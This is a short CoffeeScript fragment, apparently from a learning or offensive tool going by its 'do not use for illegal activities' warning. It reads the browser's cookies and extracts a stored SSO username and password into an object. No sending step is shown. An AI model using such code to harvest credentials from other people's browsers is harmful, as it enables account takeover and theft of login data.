###
WARNING: USE FOR LEARNING PURPOSES ONLY, DO NOT USE FOR ILLEGAL ACTIVITIES

This code is licensed under the GPLv2 License. See COPYING
###

USERNAME = '_USERNAME'
PASSWORD = '_PASSWORD'

sso_account = {
    username: null,
    pw: null
}

for c in document.cookie.split(';')
    cstrp = decodeURIComponent(c.split('=')[1])
    c.includes(USERNAME) and sso_account.username = cstrp
    c.includes(PASSWORD) and sso_account.pw = cstrp
